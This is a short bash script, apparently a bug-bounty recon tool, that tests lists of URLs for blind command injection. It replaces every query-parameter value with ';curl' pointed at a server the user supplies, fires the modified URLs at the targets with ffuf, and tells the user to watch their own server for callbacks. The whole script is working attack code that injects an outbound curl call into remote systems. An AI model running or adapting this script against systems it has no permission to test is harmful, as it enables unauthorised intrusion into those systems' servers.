#!/bin/bash
#Coded by @lemosnlmb

#Colors
RED='\033[1;31m'
NC='\033[0m'

list=$1
server=$2

cat $list | grep "=" | qsreplace ";curl $server" 2>/dev/null | sort -u > $list.tmp
echo -e "${RED}CHECK YOUR SERVER FOR POTENTIALS CALLBACKS!${NC}"
ffuf -r -w $list.tmp -u FUZZ 2 > /dev/null

rm -rf $list.tmp
